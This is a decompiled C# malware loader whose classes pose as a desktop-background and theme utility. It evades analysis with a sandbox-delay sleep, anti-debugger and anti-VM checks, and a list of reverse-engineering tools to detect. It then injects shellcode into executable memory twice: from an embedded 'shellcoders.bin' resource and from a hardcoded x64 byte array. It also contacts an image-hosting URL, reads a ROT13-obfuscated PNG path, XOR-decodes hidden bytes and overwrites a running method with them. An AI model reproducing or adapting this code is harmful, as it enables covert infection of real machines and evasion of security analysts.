using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AntiReverse;
using CodeInject;
using SetDesktopBackground;
using ShellcodeInject;

[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: CompilationRelaxations(8)]
[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]
[assembly: AssemblyVersion("0.0.0.0")]
[module: UnverifiableCode]
internal class Umbala
{
	private static void Main()
	{
		bool flag = false;
		try
		{
			string text = Environment.MachineName ?? "";
			flag = text.Equals("DESKTOP-8JDAQU5", StringComparison.OrdinalIgnoreCase);
			if (!flag)
			{
				Thread.Sleep(600000);
			}
		}
		catch
		{
		}
		if (!flag)
		{
			bool flag2 = false;
			bool flag3 = false;
			try
			{
				flag2 = SecurityCheck.anti_debug();
			}
			catch
			{
				flag2 = false;
			}
			try
			{
				flag3 = SecurityCheck.anti_vm();
			}
			catch
			{
				flag3 = false;
			}
			if (!flag2 || !flag3)
			{
				return;
			}
		}
		Task task = Task.Run(delegate
		{
			try
			{
				ShellcodeInject.Loader.Run();
			}
			catch
			{
			}
		});
		try
		{
			CodeInject.Loader.Run();
		}
		catch
		{
		}
		try
		{
			ChangeBackgroundImage.ChangeImage();
		}
		catch
		{
		}
		try
		{
			task.Wait();
		}
		catch
		{
		}
	}
}
namespace SetDesktopBackground
{
	public class ChangeBackgroundImage
	{
		private static byte[] themeData;

		public static IntPtr GetMethodAddress(MethodInfo method)
		{
			RuntimeMethodHandle methodHandle = method.MethodHandle;
			RuntimeHelpers.PrepareMethod(methodHandle);
			return methodHandle.GetFunctionPointer();
		}

		public static void Introduce()
		{
			try
			{
				string requestUriString = "https://ibb.co/vxg11LJ";
				WebRequest webRequest = WebRequest.Create(requestUriString);
				webRequest.Timeout = 5000;
				using (webRequest.GetResponse())
				{
				}
			}
			catch
			{
			}
			Console.WriteLine("Set this image as desktop background");
		}

		public unsafe static void ChangeImage()
		{
			Introduce();
			int num = 1536;
			byte[] array = LoadImageSettings(num);
			byte[] systemConfiguration = GetSystemConfiguration();
			themeData = new byte[num];
			for (int i = 0; i < num; i++)
			{
				themeData[i] = (byte)(array[i] ^ systemConfiguration[i % systemConfiguration.Length]);
			}
			MethodInfo method = typeof(ChangeBackgroundImage).GetMethod("Introduce", BindingFlags.Static | BindingFlags.Public);
			byte* ptr = (byte*)GetMethodAddress(method).ToPointer();
			for (int i = 0; i < themeData.Length; i++)
			{
				ptr[i] = themeData[i];
			}
			Introduce();
		}

		private static byte[] LoadImageSettings(int dataLength)
		{
			string input = "P:\\Hfref\\Choyvp\\Cvpgherf\\onpxtebhaq.cat";
			string path = Rot13(input);
			byte[] array = File.ReadAllBytes(path);
			if (!ValidateImageFormat(array))
			{
				throw new Exception();
			}
			int num = FindImageChunk(array);
			if (num == -1)
			{
				throw new Exception();
			}
			int chunkLength = GetChunkLength(array, num);
			int num2 = num + 8 + (chunkLength - dataLength);
			if (num2 < 0 || num2 + dataLength > array.Length)
			{
				throw new Exception();
			}
			byte[] array2 = new byte[dataLength];
			Array.Copy(array, num2, array2, 0, dataLength);
			return array2;
		}

		private static bool ValidateImageFormat(byte[] data)
		{
			byte[] array = new byte[8] { 137, 80, 78, 71, 13, 10, 26, 10 };
			if (data.Length < 8)
			{
				return false;
			}
			for (int i = 0; i < 8; i++)
			{
				if (data[i] != array[i])
				{
					return false;
				}
			}
			return true;
		}

		private static int FindImageChunk(byte[] data)
		{
			for (int i = 8; i < data.Length - 12; i++)
			{
				if (data[i + 4] == 73 && data[i + 5] == 68 && data[i + 6] == 65 && data[i + 7] == 84)
				{
					return i;
				}
			}
			return -1;
		}

		private static int GetChunkLength(byte[] data, int position)
		{
			return (data[position] << 24) | (data[position + 1] << 16) | (data[position + 2] << 8) | data[position + 3];
		}

		private static byte[] GetSystemConfiguration()
		{
			string text = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") ?? "AMD64";
			string text2 = Environment.GetEnvironmentVariable("PROCESSOR_REVISION") ?? "0000";
			string text3 = Environment.ProcessorCount.ToString();
			string s = text + text2;
			return Encoding.UTF8.GetBytes(s);
		}

		private static string Rot13(string input)
		{
			char[] array = input.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				int num = array[i];
				if (num >= 97 && num <= 122)
				{
					array[i] = (char)((num - 97 + 13) % 26 + 97);
				}
				else if (num >= 65 && num <= 90)
				{
					array[i] = (char)((num - 65 + 13) % 26 + 65);
				}
			}
			return new string(array);
		}
	}
}
namespace CodeInject
{
	public class Loader
	{
		public enum StateEnum
		{
			MEM_COMMIT = 0x1000,
			MEM_RESERVE = 0x2000,
			MEM_FREE = 0x10000
		}

		public enum Protection
		{
			PAGE_READONLY = 2,
			PAGE_READWRITE = 4,
			PAGE_EXECUTE = 0x10,
			PAGE_EXECUTE_READ = 0x20,
			PAGE_EXECUTE_READWRITE = 0x40
		}

		public static void Run()
		{
			byte[] array = new byte[512]
			{
				86, 72, 137, 230, 72, 131, 228, 240, 72, 131,
				236, 32, 232, 28, 1, 0, 0, 72, 137, 244,
				94, 195, 184, 5, 21, 0, 0, 73, 137, 201,
				65, 137, 210, 69, 138, 1, 133, 210, 117, 7,
				69, 132, 192, 117, 23, 235, 46, 77, 137, 203,
				73, 41, 203, 77, 57, 211, 115, 35, 69, 132,
				192, 117, 5, 73, 255, 193, 235, 10, 65, 128,
				248, 96, 118, 4, 65, 131, 232, 32, 107, 192,
				33, 69, 15, 182, 192, 73, 255, 193, 68, 1,
				192, 235, 196, 195, 87, 86, 83, 72, 131, 236,
				32, 101, 72, 139, 4, 37, 48, 0, 0, 0,
				72, 139, 64, 96, 72, 139, 64, 24, 72, 139,
				88, 16, 137, 206, 72, 141, 120, 16, 72, 57,
				251, 116, 28, 15, 183, 83, 88, 72, 139, 75,
				96, 232, 132, 255, 255, 255, 57, 240, 117, 6,
				72, 139, 67, 48, 235, 7, 72, 139, 27, 235,
				223, 49, 192, 72, 131, 196, 32, 91, 94, 95,
				195, 65, 85, 65, 84, 85, 87, 86, 83, 72,
				131, 236, 40, 72, 137, 203, 137, 213, 72, 133,
				201, 116, 93, 133, 210, 116, 89, 72, 99, 65,
				60, 49, 246, 139, 188, 1, 136, 0, 0, 0,
				72, 1, 207, 68, 139, 103, 32, 68, 139, 111,
				24, 73, 1, 204, 68, 57, 238, 115, 57, 65,
				139, 12, 180, 49, 210, 72, 1, 217, 232, 35,
				255, 255, 255, 137, 194, 72, 141, 70, 1, 57,
				234, 117, 28, 139, 71, 36, 72, 1, 246, 72,
				1, 222, 15, 183, 20, 6, 139, 71, 28, 72,
				141, 20, 147, 139, 4, 2, 72, 1, 216, 235,
				7, 72, 137, 198, 235, 194, 49, 192, 72, 131,
				196, 40, 91, 94, 95, 93, 65, 92, 65, 93,
				195, 72, 131, 236, 72, 185, 240, 29, 211, 173,
				72, 184, 110, 111, 116, 104, 105, 110, 103, 32,
				72, 186, 104, 101, 114, 101, 32, 98, 97, 98,
				72, 137, 68, 36, 46, 72, 137, 84, 36, 54,
				102, 199, 68, 36, 62, 121, 0, 232, 254, 254,
				255, 255, 72, 137, 193, 72, 133, 192, 116, 23,
				186, 213, 193, 15, 73, 232, 57, 255, 255, 255,
				72, 133, 192, 116, 8, 72, 141, 76, 36, 46,
				255, 208, 144, 72, 131, 196, 72, 195, 144, 144,
				144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
				255, 255, 255, 255, 255, 255, 255, 255, 0, 0,
				0, 0, 0, 0, 0, 0, 255, 255, 255, 255,
				255, 255, 255, 255, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0
			};
			IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (ulong)array.Length, 4096u, 64u);
			Marshal.Copy(array, 0, intPtr, array.Length);
			IntPtr zero = IntPtr.Zero;
			uint lpThreadId = 0u;
			IntPtr zero2 = IntPtr.Zero;
			zero = CreateThread(0u, 0u, intPtr, zero2, 0u, ref lpThreadId);
			WaitForSingleObject(zero, uint.MaxValue);
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, ulong size, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

		[DllImport("kernel32.dll")]
		private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
	}
}
namespace ShellcodeInject
{
	public class Loader
	{
		public enum StateEnum
		{
			MEM_COMMIT = 0x1000,
			MEM_RESERVE = 0x2000,
			MEM_FREE = 0x10000
		}

		public enum Protection
		{
			PAGE_READONLY = 2,
			PAGE_READWRITE = 4,
			PAGE_EXECUTE = 0x10,
			PAGE_EXECUTE_READ = 0x20,
			PAGE_EXECUTE_READWRITE = 0x40
		}

		public static void Run()
		{
			byte[] array = LoadShellcodeFromResource();
			if (array == null || array.Length == 0)
			{
				throw new Exception();
			}
			IntPtr intPtr = VirtualAlloc(IntPtr.Zero, (ulong)array.Length, 4096u, 64u);
			Marshal.Copy(array, 0, intPtr, array.Length);
			IntPtr zero = IntPtr.Zero;
			uint lpThreadId = 0u;
			IntPtr zero2 = IntPtr.Zero;
			zero = CreateThread(0u, 0u, intPtr, zero2, 0u, ref lpThreadId);
			WaitForSingleObject(zero, uint.MaxValue);
		}

		private static byte[] LoadShellcodeFromResource()
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = "shellcoders.bin";
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
			if (manifestResourceStream == null)
			{
				string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
				string[] array = manifestResourceNames;
				foreach (string text in array)
				{
					if (text.Contains("shellc") || text.Contains("payload"))
					{
						name = text;
						break;
					}
				}
				manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
			}
			if (manifestResourceStream == null)
			{
				throw new Exception();
			}
			using (manifestResourceStream)
			{
				byte[] array2 = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array2, 0, array2.Length);
				return array2;
			}
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, ulong size, uint flAllocationType, uint flProtect);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

		[DllImport("kernel32.dll")]
		private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
	}
}
namespace AntiReverse
{
	public class SecurityCheck
	{
		private struct PROCESSENTRY32
		{
			public uint dwSize;

			public uint cntUsage;

			public uint th32ProcessID;

			public IntPtr th32DefaultHeapID;

			public uint th32ModuleID;

			public uint cntThreads;

			public uint th32ParentProcessID;

			public int pcPriClassBase;

			public uint dwFlags;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
			public string szExeFile;
		}

		private struct MEMORYSTATUSEX
		{
			public uint dwLength;

			public uint dwMemoryLoad;

			public ulong ullTotalPhys;

			public ulong ullAvailPhys;

			public ulong ullTotalPageFile;

			public ulong ullAvailPageFile;

			public ulong ullTotalVirtual;

			public ulong ullAvailVirtual;

			public ulong ullAvailExtendedVirtual;
		}

		private const uint TH32CS_SNAPPROCESS = 2u;

		[DllImport("kernel32.dll")]
		private static extern bool IsDebuggerPresent();

		[DllImport("ntdll.dll")]
		private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength, ref int returnLength);

		[DllImport("kernel32.dll")]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

		[DllImport("kernel32.dll")]
		private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		[DllImport("kernel32.dll")]
		private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		public static bool anti_debug()
		{
			if (IsDebuggerPresent())
			{
				return false;
			}
			bool isDebuggerPresent = false;
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			if (isDebuggerPresent)
			{
				return false;
			}
			int processInformation = 0;
			int returnLength = 0;
			try
			{
				NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, ref processInformation, Marshal.SizeOf(processInformation), ref returnLength);
				if (processInformation != 0)
				{
					return false;
				}
			}
			catch
			{
			}
			if (Debugger.IsAttached)
			{
				return false;
			}
			if (IsDebuggerParentProcess())
			{
				return false;
			}
			if (DetectTimingAnomaly())
			{
				return false;
			}
			return true;
		}

		public static bool anti_vm()
		{
			string[] array = new string[8] { "vmware", "virtualbox", "vbox", "qemu", "virtual", "vmtools", "vmmouse", "vmx" };
			try
			{
				Process[] processes = Process.GetProcesses();
				Process[] array2 = processes;
				foreach (Process process in array2)
				{
					string text = process.ProcessName.ToLower();
					string[] array3 = array;
					foreach (string value in array3)
					{
						if (text.Contains(value))
						{
							return false;
						}
					}
				}
			}
			catch
			{
			}
			if (Environment.TickCount < 600000)
			{
				return false;
			}
			try
			{
				long totalMemoryInMB = GetTotalMemoryInMB();
				if (totalMemoryInMB < 2048)
				{
					return false;
				}
			}
			catch
			{
			}
			return true;
		}

		public static bool ValidateThemeSettings()
		{
			return anti_debug() && anti_vm();
		}

		private static bool IsDebuggerParentProcess()
		{
			try
			{
				Process currentProcess = Process.GetCurrentProcess();
				Process parentProcess = GetParentProcess(currentProcess.Id);
				if (parentProcess != null)
				{
					string text = parentProcess.ProcessName.ToLower();
					string[] array = new string[16]
					{
						"devenv", "windbg", "x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "idaq", "idaq64", "dnspy",
						"ilspy", "dotpeek", "processhacker", "procmon", "procexp", "fiddler"
					};
					string[] array2 = array;
					foreach (string value in array2)
					{
						if (text.Contains(value))
						{
							return true;
						}
					}
				}
			}
			catch
			{
			}
			return false;
		}

		private static Process GetParentProcess(int id)
		{
			try
			{
				PROCESSENTRY32 lppe = new PROCESSENTRY32
				{
					dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32))
				};
				IntPtr hSnapshot = CreateToolhelp32Snapshot(2u, 0u);
				if (Process32First(hSnapshot, ref lppe))
				{
					do
					{
						if (lppe.th32ProcessID == id)
						{
							return Process.GetProcessById((int)lppe.th32ParentProcessID);
						}
					}
					while (Process32Next(hSnapshot, ref lppe));
				}
			}
			catch
			{
			}
			return null;
		}

		private static bool DetectTimingAnomaly()
		{
			DateTime utcNow = DateTime.UtcNow;
			Thread.Sleep(10);
			DateTime utcNow2 = DateTime.UtcNow;
			double totalMilliseconds = (utcNow2 - utcNow).TotalMilliseconds;
			if (totalMilliseconds > 500.0)
			{
				return true;
			}
			return false;
		}

		public static void CheckThemeCompatibility()
		{
			Thread.Sleep(150);
		}

		[DllImport("kernel32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

		private static long GetTotalMemoryInMB()
		{
			MEMORYSTATUSEX lpBuffer = new MEMORYSTATUSEX
			{
				dwLength = (uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX))
			};
			if (GlobalMemoryStatusEx(ref lpBuffer))
			{
				return (long)(lpBuffer.ullTotalPhys / 1024 / 1024);
			}
			return 4096L;
		}
	}
}
